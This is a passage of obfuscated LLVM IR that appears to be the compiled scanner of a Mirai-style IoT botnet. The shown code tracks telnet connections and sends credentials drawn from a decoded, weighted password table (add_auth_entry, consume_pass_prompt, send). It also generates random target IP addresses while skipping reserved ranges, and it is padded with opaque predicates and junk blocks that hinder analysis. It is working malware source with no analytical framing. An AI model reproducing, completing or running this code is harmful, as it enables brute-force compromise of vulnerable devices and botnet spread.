  %1819 = sub i32 %1818, 1
  %1820 = call i32 @htonl(i32 %1819) #7
  %1821 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %1822 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1821, i32 0, i32 8
  %1823 = load i32, i32* %1822, align 4
  %1824 = icmp ne i32 %1820, %1823
  br label %originalBB64

originalBB69alteredBB:                            ; preds = %originalBB69, %566
  %1825 = load i32, i32* %18, align 4
  %1826 = icmp slt i32 %1825, 256
  br label %originalBB69

originalBB73alteredBB:                            ; preds = %originalBB73, %585
  %1827 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %1828 = load i32, i32* %18, align 4
  %1829 = sext i32 %1828 to i64
  %1830 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1827, i64 %1829
  %1831 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1830, i32 0, i32 3
  %1832 = load i32, i32* %1831, align 8
  %1833 = icmp eq i32 %1832, 0
  br label %originalBB73

originalBB77alteredBB:                            ; preds = %originalBB77, %609
  %1834 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %1835 = load i32, i32* %18, align 4
  %1836 = sext i32 %1835 to i64
  %1837 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1834, i64 %1836
  store %struct.scanner_connection* %1837, %struct.scanner_connection** %22, align 8
  %1838 = load i32, i32* %18, align 4
  store i32 %1838, i32* %9, align 4
  br label %originalBB77

originalBB81alteredBB:                            ; preds = %originalBB81, %651
  br label %originalBB81

originalBB85alteredBB:                            ; preds = %originalBB85, %688
  %1839 = load i32, i32* %1, align 4
  %1840 = icmp slt i32 %1839, 256
  br label %originalBB85

originalBB89alteredBB:                            ; preds = %originalBB89, %707
  %1841 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %1842 = load i32, i32* %1, align 4
  %1843 = sext i32 %1842 to i64
  %1844 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1841, i64 %1843
  store %struct.scanner_connection* %1844, %struct.scanner_connection** %7, align 8
  %1845 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1846 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1845, i32 0, i32 3
  %1847 = load i32, i32* %1846, align 8
  %1848 = icmp ugt i32 %1847, 1
  %1849 = select i1 %1848, i32 30, i32 5
  store i32 %1849, i32* %28, align 4
  %1850 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1851 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1850, i32 0, i32 3
  %1852 = load i32, i32* %1851, align 8
  %1853 = icmp ne i32 %1852, 0
  br label %originalBB89

originalBB93alteredBB:                            ; preds = %originalBB93, %737
  %1854 = load i32, i32* @fake_time, align 4
  %1855 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1856 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1855, i32 0, i32 2
  %1857 = load i32, i32* %1856, align 4
  %_94 = sub i32 %1854, %1857
  %gen95 = mul i32 %_94, %1857
  %_96 = shl i32 %1854, %1857
  %1858 = sub i32 %1854, %1857
  %1859 = load i32, i32* %28, align 4
  %1860 = icmp ugt i32 %1858, %1859
  br label %originalBB93

originalBB100alteredBB:                           ; preds = %originalBB100, %772
  %1861 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1862 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1861, i32 0, i32 8
  %1863 = load i8, i8* %1862, align 8
  %_101 = shl i8 %1863, 1
  %_102 = shl i8 %1863, 1
  %_103 = sub i8 0, %1863
  %gen104 = add i8 %_103, 1
  %1864 = add i8 %1863, 1
  store i8 %1864, i8* %1862, align 8
  %1865 = zext i8 %1864 to i32
  %1866 = icmp eq i32 %1865, 10
  br label %originalBB100

originalBB108alteredBB:                           ; preds = %originalBB108, %800
  %1867 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  call void @setup_connection(%struct.scanner_connection* %1867)
  br label %originalBB108

originalBB112alteredBB:                           ; preds = %originalBB112, %818
  br label %originalBB112

originalBB116alteredBB:                           ; preds = %originalBB116, %840
  br label %originalBB116

originalBB120alteredBB:                           ; preds = %originalBB120, %857
  %1868 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1869 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1868, i32 0, i32 3
  %1870 = load i32, i32* %1869, align 8
  %1871 = icmp eq i32 %1870, 1
  br label %originalBB120

originalBB124alteredBB:                           ; preds = %originalBB124, %899
  %1872 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1873 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1872, i32 0, i32 1
  %1874 = load i32, i32* %1873, align 8
  store i32 %1874, i32* %12, align 4
  br label %originalBB124

originalBB128alteredBB:                           ; preds = %originalBB128, %964
  %1875 = load i32, i32* %11, align 4
  br label %originalBB128

originalBB132alteredBB:                           ; preds = %originalBB132, %1066
  br label %originalBB132

originalBB136alteredBB:                           ; preds = %originalBB136, %1089
  %1876 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1877 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1876, i32 0, i32 6
  %1878 = load i32, i32* %1877, align 4
  %1879 = icmp eq i32 %1878, 256
  br label %originalBB136

originalBB140alteredBB:                           ; preds = %originalBB140, %1122
  %1880 = call i32* @__errno_location() #7
  store i32 0, i32* %1880, align 4
  %1881 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1882 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1881, i32 0, i32 1
  %1883 = load i32, i32* %1882, align 8
  %1884 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1885 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1884, i32 0, i32 7
  %1886 = getelementptr inbounds [256 x i8], [256 x i8]* %1885, i32 0, i32 0
  %1887 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1888 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1887, i32 0, i32 6
  %1889 = load i32, i32* %1888, align 4
  %1890 = sext i32 %1889 to i64
  %1891 = getelementptr inbounds i8, i8* %1886, i64 %1890
  %1892 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1893 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1892, i32 0, i32 6
  %1894 = load i32, i32* %1893, align 4
  %_141 = sub i32 0, 256
  %gen142 = add i32 %_141, %1894
  %_143 = sub i32 256, %1894
  %gen144 = mul i32 %_143, %1894
  %_145 = sub i32 0, 256
  %gen146 = add i32 %_145, %1894
  %_147 = sub i32 256, %1894
  %gen148 = mul i32 %_147, %1894
  %_149 = shl i32 256, %1894
  %1895 = sub nsw i32 256, %1894
  %1896 = call i32 @recv_strip_null(i32 %1883, i8* %1891, i32 %1895, i32 16384)
  store i32 %1896, i32* %32, align 4
  %1897 = load i32, i32* %32, align 4
  %1898 = icmp eq i32 %1897, 0
  br label %originalBB140

originalBB153alteredBB:                           ; preds = %originalBB153, %1167
  %1899 = call i32* @__errno_location() #7
  %1900 = load i32, i32* %1899, align 4
  %1901 = icmp ne i32 %1900, 11
  br label %originalBB153

originalBB157alteredBB:                           ; preds = %originalBB157, %1205
  %1902 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  call void @setup_connection(%struct.scanner_connection* %1902)
  br label %originalBB157

originalBB161alteredBB:                           ; preds = %originalBB161, %1225
  %1903 = load i32, i32* %32, align 4
  %1904 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1905 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1904, i32 0, i32 6
  %1906 = load i32, i32* %1905, align 4
  %_162 = sub i32 0, %1906
  %gen163 = add i32 %_162, %1903
  %_164 = shl i32 %1906, %1903
  %_165 = sub i32 %1906, %1903
  %gen166 = mul i32 %_165, %1903
  %1907 = add nsw i32 %1906, %1903
  store i32 %1907, i32* %1905, align 4
  %1908 = load i32, i32* @fake_time, align 4
  %1909 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1910 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1909, i32 0, i32 2
  store i32 %1908, i32* %1910, align 4
  br label %originalBB161

originalBB170alteredBB:                           ; preds = %originalBB170, %1254
  %1911 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1912 = call i32 @consume_iacs(%struct.scanner_connection* %1911)
  store i32 %1912, i32* %33, align 4
  %1913 = icmp sgt i32 %1912, 0
  br label %originalBB170

originalBB174alteredBB:                           ; preds = %originalBB174, %1305
  %1914 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1915 = call i32 @consume_pass_prompt(%struct.scanner_connection* %1914)
  store i32 %1915, i32* %33, align 4
  %1916 = icmp sgt i32 %1915, 0
  br label %originalBB174

originalBB178alteredBB:                           ; preds = %originalBB178, %1325
  %1917 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1918 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1917, i32 0, i32 1
  %1919 = load i32, i32* %1918, align 8
  %1920 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1921 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1920, i32 0, i32 0
  %1922 = load %struct.scanner_auth*, %struct.scanner_auth** %1921, align 8
  %1923 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %1922, i32 0, i32 1
  %1924 = load i8*, i8** %1923, align 8
  %1925 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1926 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1925, i32 0, i32 0
  %1927 = load %struct.scanner_auth*, %struct.scanner_auth** %1926, align 8
  %1928 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %1927, i32 0, i32 5
  %1929 = load i8, i8* %1928, align 1
  %1930 = zext i8 %1929 to i64
  %1931 = call i64 @send(i32 %1919, i8* %1924, i64 %1930, i32 16384)
  %1932 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1933 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1932, i32 0, i32 1
  %1934 = load i32, i32* %1933, align 8
  %1935 = call i64 @send(i32 %1934, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.32, i32 0, i32 0), i64 2, i32 16384)
  %1936 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1937 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1936, i32 0, i32 3
  store i32 5, i32* %1937, align 8
  br label %originalBB178

originalBB182alteredBB:                           ; preds = %originalBB182, %1363
  br label %originalBB182

originalBB186alteredBB:                           ; preds = %originalBB186, %1384
  call void @table_unlock_val(i8 zeroext 5)
  %1938 = call i8* @table_retrieve_val(i32 5, i32* %35)
  store i8* %1938, i8** %34, align 8
  %1939 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1940 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1939, i32 0, i32 1
  %1941 = load i32, i32* %1940, align 8
  %1942 = load i8*, i8** %34, align 8
  %1943 = load i32, i32* %35, align 4
  %1944 = sext i32 %1943 to i64
  %1945 = call i64 @send(i32 %1941, i8* %1942, i64 %1944, i32 16384)
  %1946 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1947 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1946, i32 0, i32 1
  %1948 = load i32, i32* %1947, align 8
  %1949 = call i64 @send(i32 %1948, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.32, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 5)
  %1950 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1951 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1950, i32 0, i32 3
  store i32 6, i32* %1951, align 8
  br label %originalBB186

originalBB190alteredBB:                           ; preds = %originalBB190, %1415
  br label %originalBB190

originalBB194alteredBB:                           ; preds = %originalBB194, %1451
  br label %originalBB194

originalBB198alteredBB:                           ; preds = %originalBB198, %1472
  call void @table_unlock_val(i8 zeroext 4)
  %1952 = call i8* @table_retrieve_val(i32 4, i32* %39)
  store i8* %1952, i8** %38, align 8
  %1953 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1954 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1953, i32 0, i32 1
  %1955 = load i32, i32* %1954, align 8
  %1956 = load i8*, i8** %38, align 8
  %1957 = load i32, i32* %39, align 4
  %1958 = sext i32 %1957 to i64
  %1959 = call i64 @send(i32 %1955, i8* %1956, i64 %1958, i32 16384)
  %1960 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1961 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1960, i32 0, i32 1
  %1962 = load i32, i32* %1961, align 8
  %1963 = call i64 @send(i32 %1962, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.32, i32 0, i32 0), i64 2, i32 16384)
  call void @table_lock_val(i8 zeroext 4)
  %1964 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1965 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1964, i32 0, i32 3
  store i32 8, i32* %1965, align 8
  br label %originalBB198

originalBB202alteredBB:                           ; preds = %originalBB202, %1523
  br label %originalBB202

originalBB206alteredBB:                           ; preds = %originalBB206, %1559
  br label %originalBB206

originalBB210alteredBB:                           ; preds = %originalBB210, %1576
  %1966 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1967 = call i32 @consume_resp_prompt(%struct.scanner_connection* %1966)
  store i32 %1967, i32* %33, align 4
  %1968 = load i32, i32* %33, align 4
  %1969 = icmp eq i32 %1968, -1
  br label %originalBB210

originalBB214alteredBB:                           ; preds = %originalBB214, %1597
  %1970 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1971 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1970, i32 0, i32 1
  %1972 = load i32, i32* %1971, align 8
  %1973 = call i32 @close(i32 %1972)
  %1974 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1975 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1974, i32 0, i32 1
  store i32 -1, i32* %1975, align 8
  %1976 = load %struct.scanner_connection*, %struct.scanner_connection** %7, align 8
  %1977 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %1976, i32 0, i32 8
  %1978 = load i8, i8* %1977, align 8
  %_215 = sub i8 %1978, 1
  %gen216 = mul i8 %_215, 1
  %_217 = sub i8 %1978, 1
  %gen218 = mul i8 %_217, 1
  %_219 = shl i8 %1978, 1
  %_220 = sub i8 0, %1978
  %gen221 = add i8 %_220, 1
  %_222 = sub i8 %1978, 1
  %gen223 = mul i8 %_222, 1
  %_224 = sub i8 %1978, 1
  %gen225 = mul i8 %_224, 1
  %_226 = sub i8 %1978, 1
  %gen227 = mul i8 %_226, 1
  %_228 = sub i8 %1978, 1
  %gen229 = mul i8 %_228, 1
  %1979 = add i8 %1978, 1
  store i8 %1979, i8* %1977, align 8
  %1980 = zext i8 %1979 to i32
  %1981 = icmp eq i32 %1980, 10
  br label %originalBB214

originalBB233alteredBB:                           ; preds = %originalBB233, %1655
  br label %originalBB233

originalBB237alteredBB:                           ; preds = %originalBB237, %1673
  store i32 0, i32* %33, align 4
  br label %originalBB237

originalBB241alteredBB:                           ; preds = %originalBB241, %1723
  br label %originalBB241

originalBB245alteredBB:                           ; preds = %originalBB245, %1741
  br label %originalBB245

originalBB249alteredBB:                           ; preds = %originalBB249, %1759
  %1982 = load i32, i32* %1, align 4
  %_250 = sub i32 %1982, 1
  %gen251 = mul i32 %_250, 1
  %_252 = sub i32 %1982, 1
  %gen253 = mul i32 %_252, 1
  %_254 = shl i32 %1982, 1
  %_255 = sub i32 0, %1982
  %gen256 = add i32 %_255, 1
  %_257 = sub i32 %1982, 1
  %gen258 = mul i32 %_257, 1
  %_259 = sub i32 %1982, 1
  %gen260 = mul i32 %_259, 1
  %_261 = sub i32 0, %1982
  %gen262 = add i32 %_261, 1
  %_263 = sub i32 0, %1982
  %gen264 = add i32 %_263, 1
  %_265 = sub i32 %1982, 1
  %gen266 = mul i32 %_265, 1
  %1983 = add nsw i32 %1982, 1
  store i32 %1983, i32* %1, align 4
  br label %originalBB249
}

declare i32 @util_local_addr() #3

declare void @rand_init() #3

; Function Attrs: nounwind readnone
declare zeroext i16 @ntohs(i16 zeroext) #2

; Function Attrs: noinline nounwind uwtable
define internal void @add_auth_entry(i8*, i8*, i16 zeroext) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  store i16 %2, i16* %6, align 2
  %8 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %9 = bitcast %struct.scanner_auth* %8 to i8*
  %10 = load i32, i32* @auth_table_len, align 4
  %11 = add nsw i32 %10, 1
  %12 = sext i32 %11 to i64
  %13 = mul i64 %12, 24
  %14 = call i8* @realloc(i8* %9, i64 %13) #6
  %15 = bitcast i8* %14 to %struct.scanner_auth*
  store %struct.scanner_auth* %15, %struct.scanner_auth** @auth_table, align 8
  %16 = load i8*, i8** %4, align 8
  %17 = call i8* @deobf(i8* %16, i32* %7)
  %18 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %19 = load i32, i32* @auth_table_len, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %18, i64 %20
  %22 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %21, i32 0, i32 0
  store i8* %17, i8** %22, align 8
  %23 = load i32, i32* %7, align 4
  %24 = trunc i32 %23 to i8
  %25 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %26 = load i32, i32* @auth_table_len, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %25, i64 %27
  %29 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %28, i32 0, i32 4
  store i8 %24, i8* %29, align 4
  %30 = load i8*, i8** %5, align 8
  %31 = call i8* @deobf(i8* %30, i32* %7)
  %32 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %33 = load i32, i32* @auth_table_len, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %32, i64 %34
  %36 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %35, i32 0, i32 1
  store i8* %31, i8** %36, align 8
  %37 = load i32, i32* %7, align 4
  %38 = trunc i32 %37 to i8
  %39 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %40 = load i32, i32* @auth_table_len, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %39, i64 %41
  %43 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %42, i32 0, i32 5
  store i8 %38, i8* %43, align 1
  %44 = load i16, i16* @auth_table_max_weight, align 2
  %45 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %46 = load i32, i32* @auth_table_len, align 4
  %47 = sext i32 %46 to i64
  %48 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %45, i64 %47
  %49 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %48, i32 0, i32 2
  store i16 %44, i16* %49, align 8
  %50 = load i16, i16* @auth_table_max_weight, align 2
  %51 = zext i16 %50 to i32
  %52 = load i16, i16* %6, align 2
  %53 = zext i16 %52 to i32
  %54 = add nsw i32 %51, %53
  %55 = trunc i32 %54 to i16
  %56 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %57 = load i32, i32* @auth_table_len, align 4
  %58 = add nsw i32 %57, 1
  store i32 %58, i32* @auth_table_len, align 4
  %59 = sext i32 %57 to i64
  %60 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %56, i64 %59
  %61 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %60, i32 0, i32 3
  store i16 %55, i16* %61, align 2
  %62 = load i16, i16* %6, align 2
  %63 = zext i16 %62 to i32
  %64 = load i16, i16* @auth_table_max_weight, align 2
  %65 = zext i16 %64 to i32
  %66 = add nsw i32 %65, %63
  %67 = trunc i32 %66 to i16
  store i16 %67, i16* @auth_table_max_weight, align 2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_random_ip() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8, align 1
  %3 = alloca i8, align 1
  %4 = alloca i8, align 1
  %5 = alloca i8, align 1
  br label %6

; <label>:6:                                      ; preds = %5259, %0
  %7 = call i32 @rand_next()
  store i32 %7, i32* %1, align 4
  %8 = load i32, i32* %1, align 4
  %9 = and i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* %2, align 1
  %11 = load i32, i32* %1, align 4
  %12 = lshr i32 %11, 8
  %13 = and i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* %3, align 1
  %15 = load i32, i32* %1, align 4
  %16 = lshr i32 %15, 16
  %17 = and i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* %4, align 1
  %19 = load i32, i32* %1, align 4
  %20 = lshr i32 %19, 24
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* %5, align 1
  br label %23

; <label>:23:                                     ; preds = %6
  %24 = load i8, i8* %2, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %25, 127
  br i1 %26, label %5259, label %27

; <label>:27:                                     ; preds = %23
  %28 = load i8, i8* %2, align 1
  %29 = zext i8 %28 to i32
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %5259, label %31

; <label>:31:                                     ; preds = %27
  %32 = load i8, i8* %2, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 3
  br i1 %34, label %5259, label %35

; <label>:35:                                     ; preds = %31
  %36 = load i8, i8* %2, align 1
  %37 = zext i8 %36 to i32
  %38 = icmp eq i32 %37, 15
  br i1 %38, label %5259, label %39

; <label>:39:                                     ; preds = %35
  %40 = load i32, i32* @x.57
  %41 = load i32, i32* @y.58
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %39
  %48 = load i8, i8* %2, align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 56
  %51 = load i32, i32* @x.57
  %52 = load i32, i32* @y.58
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %50, label %5259, label %59

; <label>:59:                                     ; preds = %originalBBpart2
  %60 = load i8, i8* %2, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp eq i32 %61, 10
  br i1 %62, label %5259, label %63

; <label>:63:                                     ; preds = %59
  %64 = load i8, i8* %2, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp eq i32 %65, 25
  br i1 %66, label %5259, label %67

; <label>:67:                                     ; preds = %63
  %68 = load i32, i32* @x.57
  %69 = load i32, i32* @y.58
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %67
  %76 = load i8, i8* %2, align 1
  %77 = zext i8 %76 to i32
  %78 = icmp eq i32 %77, 49
  %79 = load i32, i32* @x.57
  %80 = load i32, i32* @y.58
  %81 = sub i32 %79, 1
  %82 = mul i32 %79, %81
  %83 = urem i32 %82, 2
  %84 = icmp eq i32 %83, 0
  %85 = icmp slt i32 %80, 10
  %86 = or i1 %84, %85
  br i1 %86, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %78, label %5259, label %87

; <label>:87:                                     ; preds = %originalBBpart24
  %88 = load i8, i8* %2, align 1
  %89 = zext i8 %88 to i32
  %90 = icmp eq i32 %89, 50
  br i1 %90, label %5259, label %91

; <label>:91:                                     ; preds = %87
  %92 = load i32, i32* @x.57
  %93 = load i32, i32* @y.58
  %94 = sub i32 %92, 1
  %95 = mul i32 %92, %94
  %96 = urem i32 %95, 2
  %97 = icmp eq i32 %96, 0
  %98 = icmp slt i32 %93, 10
  %99 = or i1 %97, %98
  br i1 %99, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %91
  %100 = load i8, i8* %2, align 1
  %101 = zext i8 %100 to i32
  %102 = icmp eq i32 %101, 137
  %103 = load i32, i32* @x.57
  %104 = load i32, i32* @y.58
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %102, label %5259, label %111

; <label>:111:                                    ; preds = %originalBBpart28
  %112 = load i8, i8* %2, align 1
  %113 = zext i8 %112 to i32
  %114 = icmp eq i32 %113, 6
  br i1 %114, label %5259, label %115

; <label>:115:                                    ; preds = %111
  %116 = load i32, i32* @x.57
  %117 = load i32, i32* @y.58
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %115
  %124 = load i8, i8* %2, align 1
  %125 = zext i8 %124 to i32
  %126 = icmp eq i32 %125, 7
  %127 = load i32, i32* @x.57
  %128 = load i32, i32* @y.58
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %126, label %5259, label %135

; <label>:135:                                    ; preds = %originalBBpart212
  %136 = load i32, i32* @x.57
  %137 = load i32, i32* @y.58
  %138 = sub i32 %136, 1
  %139 = mul i32 %136, %138
  %140 = urem i32 %139, 2
  %141 = icmp eq i32 %140, 0
  %142 = icmp slt i32 %137, 10
  %143 = or i1 %141, %142
  br i1 %143, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %135
  %144 = load i8, i8* %2, align 1
  %145 = zext i8 %144 to i32
  %146 = icmp eq i32 %145, 11
  %147 = load i32, i32* @x.57
  %148 = load i32, i32* @y.58
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br i1 %146, label %5259, label %155

; <label>:155:                                    ; preds = %originalBBpart216
  %156 = load i8, i8* %2, align 1
  %157 = zext i8 %156 to i32
  %158 = icmp eq i32 %157, 21
  br i1 %158, label %5259, label %159

; <label>:159:                                    ; preds = %155
  %160 = load i8, i8* %2, align 1
  %161 = zext i8 %160 to i32
  %162 = icmp eq i32 %161, 22
  br i1 %162, label %5259, label %163

; <label>:163:                                    ; preds = %159
  %164 = load i32, i32* @x.57
  %165 = load i32, i32* @y.58
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
  %171 = or i1 %169, %170
  br i1 %171, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %163
  %172 = load i8, i8* %2, align 1
  %173 = zext i8 %172 to i32
  %174 = icmp eq i32 %173, 26
  %175 = load i32, i32* @x.57
  %176 = load i32, i32* @y.58
  %177 = sub i32 %175, 1
  %178 = mul i32 %175, %177
  %179 = urem i32 %178, 2
  %180 = icmp eq i32 %179, 0
  %181 = icmp slt i32 %176, 10
  %182 = or i1 %180, %181
  br i1 %182, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %174, label %5259, label %183

; <label>:183:                                    ; preds = %originalBBpart220
  %184 = load i32, i32* @x.57
  %185 = load i32, i32* @y.58
  %186 = sub i32 %184, 1
  %187 = mul i32 %184, %186
  %188 = urem i32 %187, 2
  %189 = icmp eq i32 %188, 0
  %190 = icmp slt i32 %185, 10
  %191 = or i1 %189, %190
  br i1 %191, label %originalBB22, label %originalBB22alteredBB

